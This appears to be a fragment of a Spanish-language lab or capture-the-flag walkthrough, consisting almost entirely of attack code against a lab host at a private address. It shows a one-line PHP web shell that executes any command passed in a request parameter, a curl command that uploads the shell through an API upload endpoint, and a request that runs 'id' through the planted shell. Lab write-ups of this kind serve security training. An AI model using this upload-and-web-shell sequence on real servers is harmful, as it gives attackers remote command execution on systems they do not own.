____

```php
<?php SYSTEM($_REQUEST['cmd']); ?>
```

```bash
curl -X POST http://10.129.156.12:3001/api/upload/ \
  -H "Content-Type: multipart/form-data" \
  -F "file=@shell.php"
```

![Captura](../../../assets/images/reference/a7cb072d70b96890c8eb.png)

```bash
curl http://10.129.156.12:3001/uploads/shell.php\?cmd\=id
```
